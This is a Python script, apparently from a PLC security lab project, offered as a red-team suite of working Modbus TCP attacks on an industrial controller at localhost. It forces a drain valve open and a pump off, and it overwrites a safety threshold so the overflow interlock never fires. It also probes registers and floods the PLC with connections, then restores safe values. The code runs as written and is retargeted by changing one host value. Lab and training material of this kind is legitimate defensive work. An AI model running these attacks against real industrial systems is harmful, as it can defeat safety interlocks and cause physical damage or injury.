#!/usr/bin/env python3
"""
PlcSentinel - Day 5: Red Team Industrial Attack Suite
Simulates weaponized Modbus payloads and industrial attack techniques
referenced in MITRE ATT&CK for ICS:
- T0855: Unauthorized Command Message (Force Valve / Pump)
- T0836: Modify Parameter / Setpoint Poisoning
- T0846: Discharge / Loss of Containment Trigger
- T0814: Denial of Service / Connection Flooding
"""

import time
import socket
import logging
from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("RedTeamICS")

class OTAttacker:
    def __init__(self, host="127.0.0.1", port=502):
        self.host = host
        self.port = port
        self.client = ModbusTcpClient(host=self.host, port=self.port)

    def connect(self):
        return self.client.connect()

    def close(self):
        self.client.close()

    def attack_1_unauthorized_actuator_force(self):
        """
        MITRE ATT&CK for ICS - T0855: Unauthorized Command Message
        Forces Drain Valve (%QX0.1 / Coil 1) to OPEN and trips Pump to OFF.
        Impact: Process disruption, emptying reservoir unexpectedly.
        """
        logger.warning("[!] EXECUTING ATTACK 1: Forcing Actuators via FC 05...")
        # Write True to Coil 1 (Drain Valve)
        res_drain = self.client.write_coil(address=1, value=True, device_id=1)
        # Write False to Coil 0 (Pump Motor)
        res_pump = self.client.write_coil(address=0, value=False, device_id=1)
        logger.info(f"    Injected Coil 1 (Drain OPEN): {res_drain}")
        logger.info(f"    Injected Coil 0 (Pump STOP): {res_pump}")

    def attack_2_setpoint_tampering(self, malicious_threshold=9999):
        """
        MITRE ATT&CK for ICS - T0836: Modify Parameter (Setpoint Poisoning)
        Overwrites High Level Safe Threshold (%QW0 / Reg 0) from 850 (85%) to 9999.
        Impact: Safety interlock never fires; leads to catastrophic overflow.
        """
        logger.warning(f"[!] EXECUTING ATTACK 2: Poisoning High Threshold to {malicious_threshold} via FC 06...")
        res = self.client.write_register(address=0, value=malicious_threshold, device_id=1)
        logger.info(f"    Injected Register 0 Overwrite: {res}")

    def attack_3_reconnaissance_memory_sweep(self):
        """
        MITRE ATT&CK for ICS - T0843: Program Upload / Address Probing
        Sweeps Modbus memory range to discover valid registers and triggers exceptions.
        """
        logger.warning("[!] EXECUTING ATTACK 3: Memory Probing Sweep...")
        probe_addresses = [0, 1, 2, 100, 500, 1000, 8000]
        for addr in probe_addresses:
            res = self.client.read_holding_registers(address=addr, count=1, device_id=1)
            if hasattr(res, 'isError') and res.isError():
                logger.info(f"    Offset {addr:5d} -> EXCEPTION / INVALID (Code: {res})")
            else:
                logger.info(f"    Offset {addr:5d} -> ACTIVE REGISTER (Value: {res.registers[0]})")

    def attack_4_dos_syn_flood_simulation(self, burst_count=50):
        """
        MITRE ATT&CK for ICS - T0814: Denial of Service
        Rapidly opens and closes TCP connections to exhaust the PLC network stack.
        """
        logger.warning(f"[!] EXECUTING ATTACK 4: Modbus TCP Connection Burst ({burst_count} rapid sockets)...")
        success = 0
        for _ in range(burst_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect((self.host, self.port))
                s.close()
                success += 1
            except Exception:
                pass
        logger.info(f"    Burst complete: {success}/{burst_count} connections completed.")

    def restore_safety_baseline(self):
        logger.info("[+] REMEDIATION: Restoring safe engineering baseline...")
        self.client.write_coil(address=1, value=False, device_id=1)  # Drain CLOSED
        self.client.write_register(address=0, value=850, device_id=1) # High Threshold 850
        self.client.write_register(address=1, value=200, device_id=1) # Low Threshold 200
        logger.info("    Safe thresholds and actuator states restored.")

if __name__ == "__main__":
    attacker = OTAttacker()
    if attacker.connect():
        attacker.attack_1_unauthorized_actuator_force()
        time.sleep(1)
        attacker.attack_2_setpoint_tampering(malicious_threshold=9999)
        time.sleep(1)
        attacker.attack_3_reconnaissance_memory_sweep()
        time.sleep(1)
        attacker.attack_4_dos_syn_flood_simulation(burst_count=20)
        time.sleep(1)
        attacker.restore_safety_baseline()
        attacker.close()
